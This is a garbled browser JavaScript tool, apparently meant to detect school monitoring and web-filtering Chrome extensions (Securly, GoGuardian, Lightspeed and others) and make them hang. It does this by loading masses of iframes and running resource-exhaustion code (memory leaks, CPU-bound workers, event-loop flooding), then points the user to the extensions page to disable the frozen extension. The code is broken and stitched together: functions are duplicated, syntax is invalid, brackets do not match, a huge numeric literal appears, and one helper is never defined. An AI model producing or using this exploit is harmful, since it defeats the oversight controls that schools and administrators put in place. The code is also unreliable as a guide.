(async () => {
    // --- DOM Elements ---
    const slider = document.getElementById("iframeCountSlider");
    const sliderValueDisplay = document.getElementById("iframeCountValue");
    const iframeSelect = document.getElementById("iframeSelect");
    const hangButton = document.getElementById("hangButton");
    const killButton = document.getElementById("killButton");
    const overlay = document.getElementById("overlay");
    const killExtensionText = document.getElementById("killExtensionText");
    const labelForIframeSelect = document.getElementById("labelForIframeSelect");
    const labelForIframeSlider = document.getElementById("labelForIframeSlider");

    // --- Permissions (Consider if actually needed for your enhanced functionality) ---
    try {
        // Permissions might not be strictly necessary for the core hanging/detection logic
        // Consider removing if not directly used to simplify.
        // await navigator.permissions.request({ name: 'device-info' });
        // await navigator.permissions.request({ name: 'motion-sensor' });
        // await navigator.permissions.request({ name: 'embedded-content' });
    } catch (error) {
        console.error("Permissions request failed:", error);
    }

    // --- Device Info & Defaults ---
    const deviceMemory = navigator.deviceMemory || 4;
    const defaultIframeCount = Math.round(deviceMemory * 500);
    const maxIframeCount = Math.round(deviceMemory * 1500);

    // --- Slider Setup ---
    slider.value = defaultIframeCount;
    slider.max = maxIframeCount;
    sliderValueDisplay.textContent = defaultIframeCount;
    slider.addEventListener("input", () => {
        sliderValueDisplay.textContent = slider.value;
    });

    // --- Extension Detection & Population (Dynamic and Heuristic) ---
    const getCommunityExtensionIDs = async () => {
        // Placeholder: In a real application, fetch this from a remote source
        return [
            "joflmkccibkooplaeoinecjbmdebglab", // Securly
            "iheobagjkfklnlikgihanlhcddjoihkg", // Securly (old)
            "haldlgldplgnggkjaafhelgiaglafanh", // GoGuardian
            "baleiojnjpgeojohhhfbichcodgljmnj", // LANSchool
            "ddfbkhpmcdbciejenfcolaaiebnjcbfc", // Linewize
            "ghlpmldmjjhmdgmneoaibbegkjjbonbk", // Blocksi
            "igbgpehnbmhgdgjbhkkpedommgmfbeao", // FortiGuard
            "jcdhmojfecjfmbdpchihbeilohgnbdci", // Cisco Umbrella
            "jdogphakondfdmcanpapfahkdomaicfa", // ContentKeeper
            "odoanpnonilogofggaohhkdkdgbhdljp", // CK-Authenticator G3
            "jfbecfmiegcjddenjhlbhlikcbfmnafd", // Securly Classroom
            "kbohafcopfpigkjdimdcdgenlhkmhbnc", // Hapara
            "aceopacgaepdcelohobicpffbbejnfac", // Hapara (new ID)
            "kmffehbidlalibfeklaefnckpidbodff", // iboss
            "njdniclgegijdcdliklgieicanpmcngj", // Lightspeed Digital Insight Agent
            "adkcpkpghahmbopkjchobieckeoaoeem", // Lightspeed Filter Agent
            "kkbmdgjggcdajckdlbngdjonpchpaiea", // Lightspeed Classroom
            "jbddgjglgkkneonnineaohdhabjbgopi", // InterCLASS Filtering Service
            "ecjoghccnjlodjlmkgmnbnkdcbnjgden", // InterSafe GatewayConnection Agent
            "pabjlbjcgldndnpjnokjakbdofjgnfia", // LoiLo Web Filters
            "cgbbbjmgdpnifijconhamggjehlamcif", // Gopher Buddy
            "honjcnefekfnompampcpmcdadibmjhlk", // LanSchool Web Helper
            "cgigopjakkeclhggchgnhmpmhghcbnaf", // IMTLazarus
            "jjpmjccpemllnmgiaojaocgnakpmfgjg", // Impero Backdrop
            "fgmafhdohjkdhfaacgbgclmfgkgokgmb", // Mobile Guardian
            "gcjpefhffmcgplgklffgbebganmhffje", // NetSupport School Student, Lightspeed Alert Agent 1 & 2
            "fogjeanjfbiombghnmkmmophfeccjdki", // Lockdown Browser
            "ifinpabiejbjobcphhaomiifjibpkjlf", // Linewize Filter
            "kdpgkligilplaanoablcpjahjjeghcl", // Borderless Classroom Student
        ];
    };

    const detectExtension = async (extensionId) => {
        const potentialURLs = [
            `chrome-extension://${extensionId}/manifest.json`,
            `chrome-extension://${extensionId}/_locales/en/messages.json`, // Common locale file
            `chrome-extension://${extensionId}/icon-128.png`,
            `chrome-extension://${extensionId}/background.js`,
            // Add more potential paths for deeper detection
        ];

        let foundCount = 0;
        for (const url of potentialURLs) {
            try {
                const response = await fetch(url, { cache: 'no-store' });
                if (response.ok) {
                    foundCount++;
                }
            } catch (error) {
                // Ignore fetch errors, as some paths might not exist
            }
        }
        return foundCount > potentialURLs.length / 2; // Heuristic: Found more than half
    };

    const populateSelectOptions = async () => {
        iframeSelect.innerHTML = ''; // Clear existing options
        let hasSupportedExtensions = false;
        const extensionIds = await getCommunityExtensionIDs();

        for (const extensionId of extensionIds) {
            if (await detectExtension(extensionId)) {
                const manifestURL = `chrome-extension://${extensionId}/manifest.json`;
                try {
                    const response = await fetch(manifestURL, { cache: 'no-store' });
                    if (response.ok) {
                        const manifest = await response.json();
                        const name = manifest.name || `Extension with ID: ${extensionId}`;
                        const option = document.createElement("option");
                        option.value = `chrome-extension://${extensionId}/_generated_background_page.html`; // A common target
                        option.textContent = name;
                        iframeSelect.appendChild(option);
                        hasSupportedExtensions = true;
                    }
                } catch (error) {
                    console.error(`Error fetching manifest for ${extensionId}:`, error);
                }
            }
        }

        if (!hasSupportedExtensions) {
            const option = document.createElement("option");
            option.value = "";
            option.textContent = "No supported extensions detected";
            iframeSelect.appendChild(option);
            hangButton.style.display = "none";
        } else {
            hangButton.style.display = "inline-block";
        }
    };

// --- Iframe Overload with Memory Leak, CPU Consumption, Event Loop Blocking, and Subtle Techniques ---
  const createIframeWithHang = {iframeSrc} => {
    const iframe = document.createElement('iframe');
    iframe.src = iframeSrc;
    iframe.style.width = '100%';
    iframe.style.height = '100px';
killButton.addEventListener("click", function () {
    const selectedSrc = killButton.getAttribute("data-url");
    const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
    killButton.style.display = "none";
    killExtensionText.innerHTML = `Make sure to keep this tab open. Then open <a href="chrome://extensions/?id=${extensionId}" target="_blank" style="color: blue; text-decoration: underline;">chrome://extensions/?id=${extensionId}</a> in a new tab.`;
  });
});

  const populateSelectOptions = async () => {
    const extensionIDs = await getCommunityExtensionIDs();
    let hasSupportedExtensions = false;

    for (const id of extensionIDs) {
      if (await detectExtension(id)) {
        const name = await fetchExtensionName(id);
        const option = document.createElement("option");
        option.value = `chrome-extension://${id}/`;
        option.textContent = name;
        iframeSelect.appendChild(option);
        hasSupportedExtensions = true;
      }
    }

    if (!hasSupportedExtensions) {
      const option = document.createElement("option");
      option.value = "";
      option.textContent = "No supported extensions installed";
      iframeSelect.appendChild(option);
      hangButton.style.display = "none";
    }
  };

  await populateSelectOptions();

    iframe.onload = () => {
      try {
        const iframeWindow = iframe.contentWindow;
        const iframeDocument = iframe.contentDocument;
;

(function() {
  const iframeDocument = document;

  // A. Aggressive Memory Exhaustion
  let memoryLeakArray = [];
  let memoryLeakObject = {};
  let memoryLeakString = "";
  let memoryLeakTypedArray = new Uint8Array(1024);
  let memoryLeakCanvas = iframeDocument.createElement('canvas');
  memoryLeakCanvas.width = 500;
  memoryLeakCanvas.height = 500;
  let memoryLeakCanvasContext = memoryLeakCanvas.getContext('2d');

  let memoryLeakInterval = setInterval(() => {
    memoryLeakArray.push(new Array(1000).fill('memory leak'));
    memoryLeakObject[Date.now()] = new Array(1000).fill('memory leak');
    memoryLeakString += 'memory leak';
    memoryLeakTypedArray = new Uint8Array(memoryLeakTypedArray.length * 2);
    memoryLeakCanvasContext.fillRect(Math.random() * 500, Math.random() * 500, 10, 10);
    iframeDocument.body.appendChild(iframeDocument.createElement('div'));
  }, 10);

  // B. Intense CPU Consumption
  const cpuBoundTasks = [];
  for (let i = 0; i < 4; i++) {
    const worker = new Worker(URL.createObjectURL(new Blob([`
      self.onmessage = function(e) {
        let result = 0;
        for (let i = 0; i < 10000000; i++) {
          result += Math.sin(i);
        }
        self.postMessage(result);
      };
    `], { type: 'text/javascript' })));
    worker.postMessage(null);
    cpuBoundTasks.push(worker);
  }

  let cpuLoop = true;
  let cpuLoopStartTime = Date.now();
  const cpuLoopInterval = setInterval(() => {
    if (cpuLoop) {
      let result = 0;
      for (let i = 0; i < 100000; i++) {
        result += Math.sin(i);
      }
      if (Date.now() - cpuLoopStartTime > 5000) {
        cpuLoop = false;
        clearInterval(cpuLoopInterval);
      }
    }
  }, 1);

  function recursiveFunction(depth) {
    if (depth > 1000) return;
    recursiveFunction(depth + 1);
  }
  recursiveFunction(0);

  // C. Event Loop Blocking & Overload
  for (let i = 0; i < 1000; i++) {
    Promise.resolve().then(() => {
      let result = 0;
      for (let j = 0; j < 10000; j++) {
        result += Math.cos(j);
      }
    });
  }

  for (let i = 0; i < 1000; i++) {
    setTimeout(() => {
      let result = 0;
      for (let j = 0; j < 10000; j++) {
        result += Math.tan(j);
      }
    }, 1);
  }

  // D. Subtle & Continuous Resource Exhaustion
  let subtleLeak = [];
  setInterval(() => {
    subtleLeak.push({});
    iframeDocument.body.appendChild(iframeDocument.createElement('span'));
  }, 100);

  let subtleCpu = 0;
  const subtleCpuInterval = setInterval(() => {
    for (let i = 0; i < 10000; i++) {
      subtleCpu += Math.sqrt(i);
    }
  }, 100);

  // E. Exploiting Browser Rendering and Layout Engines
  let reflowElement = iframeDocument.createElement('div');
  reflowElement.style.width = '100px';
  reflowElement.style.height = '100px';
  reflowElement.style.backgroundColor = 'red';
  iframeDocument.body.appendChild(reflowElement);

  setInterval(() => {
    reflowElement.style.width = Math.random() * 200 + 'px';
    reflowElement.offsetWidth; // Force reflow
    reflowElement.style.height = Math.random() * 200 + 'px';
  }, 10);

  // F. Subtle Event Loop Manipulation
  let promiseChain = Promise.resolve();
  for (let i = 0; i < 100; i++) {
    promiseChain = promiseChain.then(() => new Promise(resolve => setTimeout(resolve, 10)));
  }

  // G. Avoiding Obvious Code Patterns
  const dynamicCode = new Function('return Math.random() * 100;');
  setInterval(() => {
    dynamicCode();
  }, 100);

  // J. Exploiting Browser Features (Less Obvious)
  const canvas = iframeDocument.createElement('canvas');
  canvas.width = 100;
  canvas.height = 100;
  const ctx = canvas.getContext('2d');
  setInterval(() => {
    ctx.fillRect(Math.random() * 100, Math.random() * 100, 1, 1);
  }, 100);

  // K. Advanced Memory Exhaustion Techniques
  let wasmMemory;
  fetch('wasm/memory.wasm') // Assuming you have a memory.wasm file
    .then(response => response.arrayBuffer())
    .then(bytes => WebAssembly.instantiate(bytes))
    .then(results => {
      wasmMemory = results.instance.exports.memory;
      setInterval(() => {
        const newBuffer = new Uint8Array(wasmMemory.buffer.byteLength * 2);
        wasmMemory.buffer = newBuffer.buffer;
      }, 100);
    });

  let obj1 = {};
  let obj2 = {};
  obj1.ref = obj2;
  obj2.ref = obj1;
  setInterval(() => {
    let obj3 = {};
    let obj4 = {};
    obj3.ref = obj4;
    obj4.ref = obj3;
  }, 100);

  let weakRef = new WeakRef({});
  setInterval(() => {
    if (weakRef.deref() === undefined) {
      weakRef = new WeakRef({});
    }
  }, 100);

  let largeString = "start";
  setInterval(() => {
    largeString += "add";
  }, 10);

  // L. Refining CPU-Bound Operations
  let cacheInvalidationArray = new Array(100000).fill(0);
  setInterval(() => {
    for (let i = 0; i < 10000; i++) {
      cacheInvalidationArray[Math.floor(Math.random() * 100000)]++;
    }
  }, 10);

  let deoptimizationVar = 0;
  function deoptimizeMe(x) {
    if (x > 100) {
      return x;
    }
    return deoptimizeMe(x + 1);
  }
  setInterval(() => {
    deoptimizationVar = deoptimizeMe(deoptimizationVar);
  }, 10);

  let matrix = new Array(100).fill(null).map(() => new Array(100).fill(0));
  setInterval(() => {
    for (let i = 0; i < 100; i++) {
      for (let j = 0; j < 100; j++) {
        matrix[i][j] += Math.random();
      }
    }
  }, 10);

  let largeNumber = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
   
 // --- Main Functionality ---
    const warning = () => {
        overlay.style.display = "flex";
        const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].textContent;
        const selectedSrc = iframeSelect.value;
        const iframeCount = parseInt(slider.value, 10);

        const popup = window.open("", "PopupWindow", `width=${window.screen.width},height=${window.screen.height}`);
        const popupDocument = popup.document;
        popupDocument.body.innerHTML = '<div id="iframeContainer"></div>';
        const iframeContainer = popupDocument.getElementById('iframeContainer');
        iframeContainer.style.display = 'flex';
        iframeContainer.style.flexDirection = 'column';
        iframeContainer.style.width = '100vw';
        iframeContainer.style.height = '100vh';

        replaceIframes(iframeContainer, selectedSrc, iframeCount);

        setTimeout(() => {
            popup.close();
            killExtensionText.innerHTML = `Now that the extension <strong>${selectedOption}</strong> has been potentially hanged, press the "Kill Extension" button.`;
            setTimeout(() => {
                overlay.style.display = "none";
                killExtensionText.style.display = "block";
                killButton.style.display = "inline-block";
                hangButton.style.display = "none";
                iframeSelect.style.display = "none";
                labelForIframeSelect.style.display = "none";
                slider.style.display = "none";
                sliderValueDisplay.style.display = "none";
                labelForIframeSlider.style.display = "none";
                killButton.setAttribute("data-url", selectedSrc);
            }, 10000);
        }, 5000);
    };

    const openExtensionPopup = () => {
        const selectedSrc = killButton.getAttribute("data-url");
        const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
        killButton.style.display = "none";
        killExtensionText.innerHTML = `To attempt to kill the extension, open the Chrome extensions page. You may need to toggle the "Developer mode" switch if it's not already enabled. Then, you can try to disable or remove the extension. <br><br> <a href="chrome://extensions/?id=${extensionId}" target="_blank">Open Chrome Extensions Page</a>`;
        killExtensionText.style.maxWidth = '600px';
        killExtensionText.style.textAlign = 'center';
        killExtensionText.style.margin = '20px auto';
        const link = killExtensionText.querySelector('a');
        link.style.display = 'block';
        link.style.padding = '10px';
        link.style.backgroundColor = '#f0f0f0';
        link.style.border = '1px solid #ccc';
        link.style.borderRadius = '5px';
        link.style.textDecoration = 'none';
        link.style.color = '#333';
        // window.location.href = `chrome://extensions/?id=${extensionId}`; // Consider opening in a new tab instead
    };

    // --- Event Listeners ---
    hangButton.addEventListener("click", warning);
    killButton.addEventListener("click", openExtensionPopup);

    // --- Initialization ---
    populateSelectOptions();
})();
